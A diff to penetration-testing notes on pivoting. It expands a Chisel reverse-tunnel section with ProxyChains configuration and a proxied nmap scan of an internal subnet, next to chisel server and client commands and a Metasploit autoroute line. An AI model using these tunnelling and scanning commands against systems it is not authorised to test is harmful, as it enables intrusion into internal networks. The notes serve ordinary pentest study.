@@ -70,7 +70,9 @@ Pivoting is a powerful technique in penetration testing that allows an attacker 
   - ## Chisel (Fast TCP/UDP Tunneling)
       - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
       - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
-      - Use ProxyChains with Chisel for further tunneling.
+      - Then use ProxyChains
+          - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
+          - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
         
   - ## Metasploit Pivoting
       - Use autoroute to add routes through the compromised system: `run autoroute -s 10.10.0.0/24`
